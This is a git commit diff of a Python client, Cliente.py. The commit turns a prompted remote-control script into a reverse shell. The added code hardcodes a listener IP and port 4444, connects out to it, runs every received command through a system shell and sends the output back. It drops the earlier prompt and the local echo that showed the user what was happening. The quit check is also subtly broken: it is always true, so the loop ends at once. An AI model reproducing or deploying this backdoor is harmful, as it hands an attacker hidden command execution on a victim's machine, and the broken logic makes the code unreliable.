980513e8b939b2b51f711a8871dc1b45d1da2228
PaulinuX11 <111267592+PaulinuX11@users.noreply.github.com>
2022-08-21 02:21:16 -0400

    Update Cliente.py

--- Cliente.py
+++ Cliente.py
@@ -1,34 +1,28 @@
-import socket
-# control operating system of target machine
+#!/usr/bin/python
+
 import os
+import socket
 import subprocess
 
-s = socket.socket() # client computer can connect to others
+HOST = '192.168.190.137' # The ip of the listener.
+PORT = 4444 # The same port as listener.
 
-# ip address of server, can use own computer's private IP if doing on local
-host = str(input("Enter the IP address of the server that wants to control your computer: "))
-port = int(input("Enter the port of the server that wants to control your computer (default input: 9999): "))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT)) # Connect to listener.
+s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.
 
-s.connect((host, port)) # binds client computer to server computer
-
-# infinite loop for continuous listening for server's commands
-while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd': # command to change directory (cd)
-                os.chdir(data[3:].decode("utf-8")) # look at target directory to cd to
-
-        if len(data) > 0: # check if there are actually data/commands received (that is not cd)
-                
-                # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-                
-                # bytes and string versions of results
-                output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
-                output_str = str(output_bytes, "utf-8") # plain old basic string
-
-                # getcwd allows the server side to see where the current working directory is on the client
-                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str) # client can see what server side is doing
-
-# close connection
-s.close()
+while 1: # Start loop.
+    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
+    if data == "quit" or "exit": 
+        break # If it's quit, then break out and close socket.
+    if data[:2] == "cd":
+        os.chdir(data[3:]) # If it's cd, change directory.
+    # Run shell command.
+    if len(data) > 0:
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
+        output_str = str(stdout_value, "UTF-8") # Format output.
+        currentWD = os.getcwd() + "> " # Get current working directory.
+        s.send(str.encode(currentWD + output_str)) # Send output to listener.
+    
+s.close() # Close socket.
